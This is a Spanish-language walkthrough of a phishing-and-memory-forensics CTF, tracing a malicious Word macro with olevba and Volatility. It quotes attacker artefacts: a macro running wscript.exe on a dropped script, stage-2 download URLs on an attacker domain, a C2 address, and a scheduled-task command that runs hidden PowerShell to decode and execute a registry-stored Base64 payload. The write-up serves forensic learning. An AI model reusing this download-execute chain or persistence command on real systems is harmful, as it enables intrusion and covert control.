Para este CTF estaré usando:
- Volatility: `vol -f memorydump.raw` sirve para analizar, por ejemplo, la memoria RAM
- Olevba: `olevba document.doc` Sirve para analizar documentos de, por ejemplo, microsoft office

Todo empieza por el correo de phishing:
![[Pasted image 20260825095622.png]]
## 1. ¿Cuál era el email usado para mandar el phishing?
![[Pasted image 20260825095824.png]]
Abriendo `Resume - Application for Junior IT Analyst Role.eml` :
![[Pasted image 20260825095941.png]]
Se ve que el correo del atacante del phishin es: `westaylor23@outlook.com`
## 2. ¿Cuál es el email de la victima?
En la imagen anterior también se puede ver el correo de la víctima: `maxine.beck@quicklogisticsorg.onmicrosoft.com`
## 3. ¿Cual es el nombre del documento malicioso?
En la imagen de la pregunta 1 se puede ver e presunto nombre del documento (Este es fiable por no se un zip, como en Boogeyman 1): `Resume_WesleyTaylor.doc`
## 4. ¿Cual es el hash MD5 del adjunto malicioso?
Para calcular el MD5 del .doc, hay que descargarlo, siempre en un entorno aislado/seguro.
![[Pasted image 20260825100305.png]]
Usando `md5sum Resume_WesleyTaylor.doc`, se ve como el hash es `52c4384a0b9e248b95804352ebec6c5b`
## 5. ¿Cual es la url usada para descargar el payload de fase 2 en base a la macro del documento?
Para esto, ahora con el archivo descargado, voy a usar olevba.
El comando es: `olevba Resume_WesleyTaylor.doc `
![[Pasted image 20260825100853.png]]
Se ve como se hace una "llamada" `GET` a la url `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`
## 6. ¿Cuál es el proceso que ejecutó el presunto payload de fase 2?
La tabla de abajo al ejecutar el comando de olevba:
![[Pasted image 20260825101254.png]]
Muestra 3 IOC (Indicator of compromise), siendo uno la update.png del enlace de la anterior pregunta, y otros 2:
- `update.js`
- `wscript.exe`
Aunque, a primera vista, es un 50-50, no es un método viable para dar una respuesta, por lo que también voy a analizar lo de arriba de la misma:
![[Pasted image 20260825102349.png]]
Parece que en la linea: `shell_object.Exec ("wscript.exe C:\ProgramData\update.js")` Parece que se puede descargar que udpate.js se ejecute primero, dejando como el proceso que lo ejecuta en un primer lugar a `wscript.exe`
## 7. ¿Cual es la ruta completa al payload de fase 2?
En esa misma última linea de comandos `shell_object.Exec ("wscript.exe C:\ProgramData\update.js")` se ve la propia ruta al stage 2 payload (update.js): `C:\ProgramData\update.js`
## 8. ¿Cual es el PID del proceso que ejecutó la fase 2 del payload?
Para esta sección, usaré volatility, para buscar el pid del proceso. 
Ejecutando: `vol -f WKSTN-2961.raw windows.pslist`, sale una extensa lista:
![[Pasted image 20260825104231.png]]
Sin embargo, sabiendo que el proceso que ejecutó `update.js` es `wscript.exe`, puedo usar grep para buscar `wscript.js` 
![[Pasted image 20260825104408.png]]
Siguiendo el orden de las columnas de la tabla (PID-PPID-ImageFileName- Offset(V)-threads-Handles-SessionId-Wow64-CreateTime-ExitTime-File output), yo me quiero fijar en la primera columna, la columna del PID. 
Para este caso, el PID de wscript.exe es `4260`
También se puede usar pstreee para este mismo caso
## 9. ¿Cual es el Parent PID del proceso que ejecutó el payload de fase 2?
El parent PID (PPID) es la segunda columna. Analizando la tabla para mayor calidad del texto que muestra, lo he encontrado prácticamente al final wscript.exe.
![[Pasted image 20260825105016.png]]
Se ve que el PPID es `1124`
## 10. ¿Que url se usó para descargar el binario malicioso ejecutado en la fase 2 del payload?
Puede parecer que la url es la misma para descargar el archivo de fase 2 del ataque:
`https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`, pero no es así, ya que, aparte de que la respuesta no coincide, no parece un archivo malicioso, por el .png.
Con ayuda externa, decidí usar la herramienta de string sobre el .raw, buscando el enlace, mas bien parte del mismo, en este caso, `boogeymanisback.lol`
![[Pasted image 20260825180810.png]]
Aparte de update.png, se ve, de exactamente el mismo enlace (salvo la uri del final, en lugar de ser update.png, es update.exe), siendo el enlace del ejecutable: `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe`
## 11. ¿Cual es el PID del proceso malicioso usado para la conexión C2?
Gracias a la url, se que el proceso nuevo descargado es `update.exe` (no update.js). Por eso voy a probar a buscalor en volatility.
![[Pasted image 20260825181921.png]]
He buscado en:
- windows.cmdline
- windows.pstree
- windows.pslist
En las 3, no parece haber ningun update.exe, sino que hay un `updater.exe`. Por orden de descarga cronológico:
![[Pasted image 20260825182840.png]]
wscript se ejecutó antes que updater.exe
Ademas, no he tenido en consideración lo que hacen los atacantes con el nombre del archivo. Es posible que le haya cambiado el nombre de update.exe a updater.exe por medio de un proceso. Como lo he visto:
1. Descarga update.png
2. Lo convierte en update.js
3. Descarga update.exe
4. Lo guarda como updater.exe y lo ejecuta
A demas, con ayuda externa, proceduralmente he vuelto a revisar pstree:
![[Pasted image 20260825183338.png]]
Se ve como el PPID de updater.exe es 4260, el mismo PID que wscipt.exe.
Por eso, se puede ver que el PID del nuevo proceso malicioso es `6216`
## 12. ¿Cual es la ruta completa del proceso malicioso usado para establecer una conexión C2?
Usando `vol -f WKSTN-2961.raw windows.cmdline | grep "updater.exe"` para buscar dicho archivo malicioso:
![[Pasted image 20260825183713.png]]
Se puede ver la ruta: `C:\Windows\Tasks\updater.exe`
## 13. ¿Cuales son la ip y el puerto usados para la conexión c2 causada por el binario malicioso?
Usando el comando de netscan, `vol -f WKSTN-2961.raw windows.netscan ` se ven varios resultados, numerosos, pero yo quiero buscar únicamente los que tienen que ver con uopdater.exe y/o con `boogeymanisback.lol`
![[Pasted image 20260825184208.png]]

Voy a buscar por updater.exe:
![[Pasted image 20260825184327.png]]
Se ve como en base a las respectivas columnas de `ForeignAddr` y `ForeignPort`, respecto a updater.exe, la ip `128.199.95.189` y que el atacante usó el puerto `8080`
## 14. ¿Cual es la ruta completa del archivo del email malicioso en base al memory dump?
Para esto, voy a usar filescan, `vol -f WKSTN-2961.raw windows.filescan`.
Pero hay demasiados archivos. 
Conociendo el archivo de correo incial:
![[Pasted image 20260825185020.png]]
Puedo buscar por `Resume_WesleyTaylor`
![[Pasted image 20260825185329.png]]
Se ve como la ruta es: `C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor`
## 15. El atacante implementó una tarea programada (scheduled task) justo despues de establecer el callback del c2, ¿cual es el comando completo usado por el atacante para mantener persistencia en el sistema?
Tras buscarlo, descubrí que se puede buscar en las strings, y que, a demás, el comando `schtasks` me recordó que es el de scheduled tasks.
Escribí el comando: `strings WKSTN-2961.raw | grep "schtasks"`: 
![[Pasted image 20260825185932.png]]
Dándome que, casualmente el más largo:
`schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"'` 
Es la respuesta de la automatización de la tarea, posiblemente para mantener persistencia en el sistema.
